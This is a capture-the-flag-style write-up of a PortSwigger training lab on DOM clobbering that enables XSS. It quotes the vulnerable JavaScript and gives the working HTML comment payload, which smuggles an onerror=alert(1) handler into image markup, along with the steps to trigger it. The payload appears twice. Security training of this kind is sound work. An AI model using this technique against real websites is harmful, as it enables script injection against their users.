# Lab: Exploiting DOM clobbering to enable XSS (Expert)

**Lab:** [https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)

**Task (from PortSwigger):**  
This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the `alert()` function.

**Note:** The intended solution to this lab will only work in Chrome.

## Vulnerability
Blog comments load `loadCommentsWithDomClobbering.js`:

```js
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
```

The `||` pattern + global makes `defaultAvatar` clobberable. Two anchors with the same `id` form a collection; `name=avatar` + `href` sets the property used as an image URL / attribute context.

## Solution

1. On a blog post, post a comment:

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

2. Post a second comment with any text so the page reloads and uses the clobbered object.

The clobbered `avatar` value smuggles `onerror=alert(1)` into the image markup.

## Final Exploit Payload (comment)
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
